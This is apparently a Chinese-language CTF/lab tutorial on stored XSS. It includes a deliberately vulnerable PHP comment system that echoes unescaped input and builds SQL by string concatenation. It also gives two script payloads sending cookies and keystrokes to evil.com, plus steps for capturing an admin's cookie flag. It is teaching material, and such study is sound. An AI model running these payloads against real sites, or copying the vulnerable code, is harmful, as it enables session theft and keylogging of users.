# 存储型 XSS

## 概述

存储型 XSS（Stored XSS）将恶意脚本永久存储在服务器上（数据库、文件等），当其他用户访问时自动触发。

## 与反射型的区别

- **反射型**：恶意代码在 URL 中，需要诱导用户点击
- **存储型**：恶意代码存储在服务器，所有访问者都会触发

## 漏洞场景

### 评论系统

```php
<?php
// 存储评论
$content = $_POST['content'];
$sql = "INSERT INTO comments (content) VALUES ('$content')";
mysqli_query($conn, $sql);

// 显示评论
$sql = "SELECT * FROM comments";
$result = mysqli_query($conn, $sql);
while ($row = mysqli_fetch_assoc($result)) {
    echo "<div>" . $row['content'] . "</div>";  // 未转义
}
?>
```

### 攻击 Payload

```html
<script>
  // 窃取 Cookie
  new Image().src = "http://evil.com/steal?c=" + document.cookie;
</script>
```

```html
<script>
  // 键盘记录
  document.addEventListener('keypress', function(e) {
    new Image().src = "http://evil.com/log?k=" + e.key;
  });
</script>
```

## 常见存储点

- 评论内容
- 用户名
- 个人简介
- 文章内容
- 留言板
- 论坛帖子

## 攻击步骤

1. 在评论框中输入 XSS payload
2. 提交评论
3. 访问评论页面 — payload 自动执行
4. 其他用户访问时也会触发

## 防御

1. 输出时转义 HTML：`htmlspecialchars()`
2. 使用 CSP（Content Security Policy）
3. 对用户输入进行过滤
4. 使用 HTTPOnly Cookie

## 练习步骤

1. 在评论框中输入 `<script>alert(1)</script>`
2. 提交并访问页面 — 确认 XSS
3. 构造窃取 flag 的 payload
4. 在管理员访问时获取 flag

## flag

在管理员的 Cookie 或特定页面中查找 `CR{...}` 格式的 flag。
